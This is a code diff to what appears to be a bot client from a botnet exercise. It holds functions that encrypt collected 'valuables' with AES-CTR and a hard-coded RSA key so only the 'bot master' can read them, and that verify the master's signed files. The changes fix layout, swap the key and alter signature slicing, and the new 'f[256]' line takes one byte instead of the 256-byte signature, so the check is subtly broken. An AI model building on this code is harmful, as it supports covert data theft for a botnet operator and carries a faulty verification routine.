@@ -5,7 +5,9 @@ from Crypto import Random
 from Crypto.Cipher import AES
 from Crypto.Util import Counter
 from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
 from Crypto.Signature import PKCS1_v1_5
+from Crypto.Hash import SHA256
 #AES.key_size = (16,24,32)
 AES_KEY_SIZE_32 = AES.key_size[2]
 
@@ -21,14 +23,21 @@ def save_valuable(data):
     valuables.append(data)
 
 def encrypt_for_master(data):
-
 #################################################
-public_key_text = """-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw/wcO39pKTQ+ArqB0oVEouQdNW2XJxEOiTaKggwABqQMO1ux4HxJ1obSx2WRI+1XmytQiGEvUp0vSX4sP9W3gE6eiPtt7S77XRv3xkvL2UfVpoqwq9zrKRupCiSmOXzZodf1WPResWJ/0x9CIFCyN0b7UprQWz14mCNh+2+GnMfx1kAKabhMMeviuHqkeAlc34hvluQwb6ipa7lrmZnA/nbRlaflPOesIcjh/rzT0gGMNwrVV66W/aufzntjdQ8sy4EhowL4nG5LJ9cwYNTsRRlfyjLmVzM06VIsOGvwITT8C8m1NeN69YcA78dwpUc0O/ddQNbijbnws1D0bcI7CwIDAQAB-----END PUBLIC KEY-----"""
+    public_key_text = """-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApIxHCL6eEHrpH9fkwHnm
++wgSmqQ3TCUo54doPGMjagDH933KeNtFbRepEJ8BvhscJxFKSuBaCWw6DymiYbPT
+B2uffJOzdfGS4N3ob5CP6efjiZ1uVE7qli4Ajt5huBXJq7Y742Px/qpxg6T3lQeJ
+OM01eIbhF5vrtSu1mNhdZ4pbDH+qVZMbo60KPdcnaoG9Kxuz5aLcqy2MeaDVBeeW
+iSNiDcebkJLzyc34faAwOoPEYIlXjU6TQSjnfj+zkEkSsGE0MB4ockYGB0YTXwR0
+Y6lZJ7Ayk+vtjOlDeZdEqcpdkt3dCrKMCN4v19ppg2pHZuYiBfM7K3BNlT3RsMr+
+QQIDAQAB
+-----END PUBLIC KEY-----"""
 #################################################
 
     # Encrypt the file so it can only be read by the bot master
 
-
+#-------------------------------------------------------------------
 #1. Setup AES Stuff
     # 8 byte (64bit) nonce/iv for CTR mode counter prefix.
     iv = Random.new().read(8)
@@ -37,18 +46,24 @@ public_key_text = """-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AM
     # Instantiate a 128bit counter object for CTR mode of operation.
     # 64bits of counter, 64bits of prefix
     counter = Counter.new(64, prefix=iv)
+
+
+#-------------------------------------------------------------------
 #2. AES Encryption of Data
     # Encrypt our data with AES/CTR mode of operation
     aes_cipher = AES.new(symmetric_key, AES.MODE_CTR, counter=counter)
     aes_ciphertext = aes_cipher.encrypt(data)
 
 
+#-------------------------------------------------------------------
 #3. Setup RSA/Asymmetric Stuff
     # The Bot gets the BotMaster's public key
     # And creates a RSA public key object
-
 #Importkey?
     rsa_public_key = RSA.importKey(public_key_text)
+
+
+#-------------------------------------------------------------------
 #4. PKCS1_OAEP Encryption of Key
     # New PKCS1_OAEP cipher instance with RSA public key
     pkcs1_cipher = PKCS1_OAEP.new(rsa_public_key)
@@ -57,6 +72,7 @@ public_key_text = """-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AM
     pkcs1_ciphertext = pkcs1_cipher.encrypt(symmetric_key)
 
 
+#-------------------------------------------------------------------
 #5. Return asymmetric ciphertext + Iv + symmetric ciphetext
     return pkcs1_ciphertext + iv + aes_ciphertext
 
@@ -81,23 +97,36 @@ def verify_file(f):
     # Naive verification by ensuring the first line has the "passkey"
 
 #################################################
-public_key_text = """-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw/wcO39pKTQ+ArqB0oVEouQdNW2XJxEOiTaKggwABqQMO1ux4HxJ1obSx2WRI+1XmytQiGEvUp0vSX4sP9W3gE6eiPtt7S77XRv3xkvL2UfVpoqwq9zrKRupCiSmOXzZodf1WPResWJ/0x9CIFCyN0b7UprQWz14mCNh+2+GnMfx1kAKabhMMeviuHqkeAlc34hvluQwb6ipa7lrmZnA/nbRlaflPOesIcjh/rzT0gGMNwrVV66W/aufzntjdQ8sy4EhowL4nG5LJ9cwYNTsRRlfyjLmVzM06VIsOGvwITT8C8m1NeN69YcA78dwpUc0O/ddQNbijbnws1D0bcI7CwIDAQAB-----END PUBLIC KEY-----"""
+    public_key_text = """-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApIxHCL6eEHrpH9fkwHnm
++wgSmqQ3TCUo54doPGMjagDH933KeNtFbRepEJ8BvhscJxFKSuBaCWw6DymiYbPT
+B2uffJOzdfGS4N3ob5CP6efjiZ1uVE7qli4Ajt5huBXJq7Y742Px/qpxg6T3lQeJ
+OM01eIbhF5vrtSu1mNhdZ4pbDH+qVZMbo60KPdcnaoG9Kxuz5aLcqy2MeaDVBeeW
+iSNiDcebkJLzyc34faAwOoPEYIlXjU6TQSjnfj+zkEkSsGE0MB4ockYGB0YTXwR0
+Y6lZJ7Ayk+vtjOlDeZdEqcpdkt3dCrKMCN4v19ppg2pHZuYiBfM7K3BNlT3RsMr+
+QQIDAQAB
+-----END PUBLIC KEY-----"""
 #################################################
 
+#-------------------------------------------------------------------
     #take Signature length of bytesfrom the file
-    # 256
-    signature = f[:256*0.125]
+    # 256, 2048 bits
+    signature = f[256]
 
+#-------------------------------------------------------------------
     # Create as RSA Key Object by importing the public key
     # pubkey_txt is hard coded, for now
     rsa_public_key = RSA.importKey(public_key_text)
 
+#-------------------------------------------------------------------
     # Get the remaining bytes of the file...
-    h = SHA256.new(f[256*0.125:])
+    h = SHA256.new(f[256:])
 
+#-------------------------------------------------------------------
     # Instantiate a PKCS1_v1_5 with the public key
     pksc1 = PKCS1_v1_5.new(rsa_public_key)
 
+#-------------------------------------------------------------------
     # Returns the boolean from the verification...
     return pksc1.verify(h, signature)
 
